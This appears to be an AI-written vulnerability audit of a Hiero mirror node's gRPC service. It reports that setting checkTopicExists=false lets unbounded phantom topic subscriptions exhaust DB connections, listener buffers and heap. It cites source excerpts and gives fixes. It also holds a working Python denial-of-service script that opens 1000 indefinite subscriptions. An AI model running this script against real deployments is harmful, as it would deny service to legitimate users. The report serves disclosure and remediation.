I've verified all code references against the actual repository. Here are my findings:

All code references have been verified against the actual repository. Every line number, method signature, and behavioral claim checks out exactly.

**SECURITY.md scope check:** The exclusion at line 44 states "Impacts that only require DDoS." This finding is distinct — it exploits a specific code-level design flaw (the phantom entity bypass) that causes indefinite resource retention per subscription, not a volumetric flood. The attack is amplified by the code path, not just by traffic volume. It is in scope.

---

Audit Report

## Title
Phantom Topic Subscription Resource Exhaustion via `checkTopicExists=false` Bypass

## Summary
When `hiero.mirror.grpc.checkTopicExists` is set to `false`, the `topicExists()` method in `TopicMessageServiceImpl` synthesizes a phantom `Entity` object for any topic ID absent from the database, allowing the full subscription pipeline to activate unconditionally. An unauthenticated attacker can exploit this to open unbounded, indefinitely-held subscriptions against arbitrary non-existent topic IDs, exhausting DB connections, listener buffer slots, and JVM heap with no rate-limiting defense in the gRPC module.

## Finding Description

**Vulnerable method — `topicExists()`:** [1](#0-0) 

When `entityRepository.findById()` returns empty and `checkTopicExists` is `false`, the `switchIfEmpty` branch at line 100 constructs a synthetic `Entity` with `type=TOPIC`. This passes the `.filter(e -> e.getType() == EntityType.TOPIC)` check at line 104, so `topicExists()` resolves successfully and the full subscription pipeline is activated.

**Subscription pipeline activated unconditionally:** [2](#0-1) 

- Line 61: `TopicContext` is allocated before `topicExists()` resolves.
- Line 63: `topicMessageRetriever.retrieve(filter, true)` — historical DB query (returns empty, but consumes a connection).
- Lines 67–70: A `Mono.delay(1s)` safety-check fires a gap-recovery DB query after 1 second.
- Line 120: `topicListener.listen(newFilter)` — registers a live listener slot in the shared buffer.
- Lines 88–91: `subscriberCount` is incremented and the subscription is held open indefinitely when no `endTime` is set (line 124: `pastEndTime()` returns `Flux.never()`).

**Default configuration confirms non-default exposure:** [3](#0-2) 

`checkTopicExists = true` is the default. Deployments that set it to `false` (e.g., when topics may not yet be indexed) are fully exposed.

**Why existing guards fail:**

- `maxConcurrentCallsPerConnection = 5` is per-connection only: [4](#0-3) 
An attacker opens N connections × 5 calls = 5N concurrent phantom subscriptions.

- `subscriberCount` is a metrics gauge only — it enforces no ceiling: [5](#0-4) 

- No `ThrottleConfiguration`, `ThrottleManagerImpl`, or `RateLimiter` exists anywhere in the `grpc` module (confirmed by search).

- The shared listener buffer is bounded at 16384 entries: [6](#0-5) 
Filling it causes `BUFFER_OVERFLOW` errors for legitimate subscribers.

## Impact Explanation

Each phantom subscription holds:
- One or more HikariCP DB connections (initial historical retrieval + 1-second safety-check gap query).
- One live listener slot in the shared buffer (`maxBufferSize = 16384`).
- A `TopicContext` object and associated `AtomicLong`/`AtomicReference` state on the JVM heap.

With no `endTime`, subscriptions are permanent until the client disconnects. Sustained attack traffic can:
1. Exhaust the HikariCP connection pool, blocking all DB-dependent operations.
2. Fill the listener buffer, causing `BUFFER_OVERFLOW` for legitimate topic subscribers.
3. Drive JVM heap toward the 80% alert threshold via accumulated `TopicContext` objects.

## Likelihood Explanation

**Precondition:** `checkTopicExists=false` must be configured. This is non-default but is a documented operator option for deployments where topics may not yet be indexed. Any such deployment is fully exposed.

**Attack accessibility:** The gRPC endpoint is unauthenticated and publicly reachable (port 5600). No exploit tooling beyond a standard gRPC client (e.g., `grpcurl`) is required. The attack is trivially scriptable: open N connections, send 5 `subscribeTopic` RPCs per connection with arbitrary topic IDs, and hold them open.

## Recommendation

1. **Add a subscription ceiling:** Introduce a configurable `maxSubscribers` property in `GrpcProperties`. In `subscribeTopic()`, check `subscriberCount.get() >= maxSubscribers` before proceeding and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Add per-IP or per-connection rate limiting** in the gRPC interceptor layer, analogous to the `ThrottleManagerImpl` pattern used in the `web3` module.
3. **Re-evaluate the `checkTopicExists=false` semantic:** Instead of synthesizing a phantom entity, consider returning a short-lived subscription that terminates with `NOT_FOUND` after a configurable timeout if the topic never appears in the DB, rather than holding resources indefinitely.
4. **Bound subscription lifetime:** Require a maximum `endTime` or enforce a server-side TTL on subscriptions with no `endTime` to prevent indefinite resource retention.

## Proof of Concept

```python
import grpc
import threading
# proto: proto/mirror/consensus_service.proto

def open_phantom_subscription(stub, topic_num):
    request = ConsensusTopicQuery(
        topicID=ConsensusTopicID(topicNum=topic_num),
        # no consensusEndTime → permanent subscription
    )
    try:
        for _ in stub.subscribeTopic(request):
            pass  # drain silently; connection held open
    except grpc.RpcError:
        pass

channel_pool = [grpc.insecure_channel("mirror-node:5600") for _ in range(200)]
threads = []
for i, ch in enumerate(channel_pool):
    stub = ConsensusServiceStub(ch)
    for j in range(5):  # maxConcurrentCallsPerConnection = 5
        # Use non-existent topic IDs (e.g., 9_000_000 + offset)
        t = threading.Thread(target=open_phantom_subscription,
                             args=(stub, 9_000_000 + i * 5 + j))
        t.daemon = True
        t.start()
        threads.append(t)

# 200 connections × 5 = 1000 phantom subscriptions held open indefinitely
# Each holds DB connections + listener slots + heap
```

With `checkTopicExists=false` configured, all 1000 subscriptions succeed and persist, consuming DB connections, listener buffer slots, and heap until the HikariCP pool or listener buffer is exhausted.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-55)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L59-92)
```java
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L94-106)
```java
    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")
                                        .type(EntityType.TOPIC)
                                        .build()))
                .filter(e -> e.getType() == EntityType.TOPIC)
                .switchIfEmpty(Mono.error(new IllegalArgumentException("Not a valid topic")));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/GrpcProperties.java (L19-19)
```java
    private boolean checkTopicExists = true;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L14-14)
```java
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L23-23)
```java
    private int maxBufferSize = 16384;
```
